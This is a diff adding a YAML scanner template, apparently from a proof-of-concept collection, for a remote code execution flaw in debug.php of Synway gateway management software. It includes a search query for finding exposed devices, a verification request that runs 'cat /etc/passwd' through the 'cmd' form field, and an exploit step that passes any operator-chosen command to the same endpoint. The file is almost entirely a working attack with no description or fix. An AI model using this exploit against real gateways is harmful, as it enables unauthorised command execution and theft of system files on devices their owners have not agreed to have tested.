@@ -1,0 +1,75 @@
+app: Synway-网关管理软件
+query: app:"Synway-网关管理软件"
+meta:
+  name: Synway-网关管理软件debug.php远程代码执行漏洞
+  level: 4
+  tags:
+  - remote_code_execution
+  description: 无
+  homepage: ""
+  author: X prism
+  references: ""
+  solution: 无
+  create_at: "2024-08-13 23:00:28"
+  available: true
+  steps:
+    variable: []
+    verify_steps:
+      type: and
+      verify:
+      - request:
+          method: POST
+          path: /debug.php
+          redirect: true
+          header:
+          - Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+          params: |-
+            ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+            Content-Disposition: form-data; name="comdtype"
+
+            1
+            ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+            Content-Disposition: form-data; name="cmd"
+
+            cat /etc/passwd
+            ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+            Content-Disposition: form-data; name="run"
+
+            ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb--
+        response:
+        - name: code
+          value: "200"
+          type: equals
+        - name: body
+          value: 'root:'
+          type: contains
+    exploit_steps:
+      type: and
+      params:
+        name: CMD
+        type: input
+        value: whoami
+      exploit:
+      - request:
+          method: POST
+          path: /debug.php
+          redirect: true
+          header:
+          - Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+          params: |-
+            ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+            Content-Disposition: form-data; name="comdtype"
+
+            1
+            ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+            Content-Disposition: form-data; name="cmd"
+
+            {{exploit}}
+            ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+            Content-Disposition: form-data; name="run"
+
+            ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb--
+        response:
+        - name: code
+          value: "200"
+          type: equals
